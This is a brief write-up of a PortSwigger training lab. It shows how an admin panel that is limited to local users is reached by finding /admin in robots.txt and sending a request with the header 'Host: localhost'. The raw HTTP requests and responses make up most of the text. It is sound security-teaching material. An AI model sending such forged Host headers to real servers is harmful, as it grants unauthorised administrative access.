# [Lab: Host header authentication bypass](https://portswigger.net/web-security/host-header/exploiting/lab-host-header-authentication-bypass)

## Lab

This lab makes an assumption about the privilege level of the user based on the HTTP Host header.

To solve the lab, access the admin panel and delete Carlos's account.

## Detect

admin end point:

```text
robots.txt

User-agent: *
Disallow: /admin
```

arbitrary host => default response

```http
GET /admin HTTP/1.1
Host: hacked

HTTP/1.1 401 Unauthorized

Admin interface only available to local users
```

## Analysis

`/admin` end point is restricted to local users only

## Solutions

use `Host: localhost` to bypass:

```http
GET /admin HTTP/1.1
Host: localhost

HTTP/1.1 200 OK
```
